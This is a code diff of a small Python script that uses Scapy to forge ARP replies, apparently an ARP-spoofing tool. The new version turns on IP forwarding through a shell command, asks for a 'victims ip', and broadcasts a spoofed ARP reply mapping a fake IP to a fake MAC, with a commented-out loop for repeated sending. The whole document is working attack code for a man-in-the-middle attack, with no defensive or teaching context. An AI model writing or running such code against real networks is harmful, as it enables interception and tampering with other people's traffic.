@@ -1,11 +1,18 @@
 from scapy.all import ARP, Ether, sendp, srp
+import os
 
-target_ip = "192.168.1.99"
-target_mac = "74:8f:3c:be:6e:b6"
-spoofed_ip = "10.13.33.37"
-spoofed_mac = "de:ad:be:ef:ca:fe"
+os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
-arp_packet = Ether(dst=target_mac)/ARP(op="is-at", psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac)
+#print("Enter the victims ip: ")
 
-sendp(arp_packet, verbose=1)
+target_ip = input("Enter the victims ip: ")
+fake_ip = "10.13.33.37"
+fake_mac = "de:ad:be:ef:ca:fe"
+
+arp_response = Ether( dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip)
+
+
+#while True:
+sendp(arp_response, verbose=1)
+
 
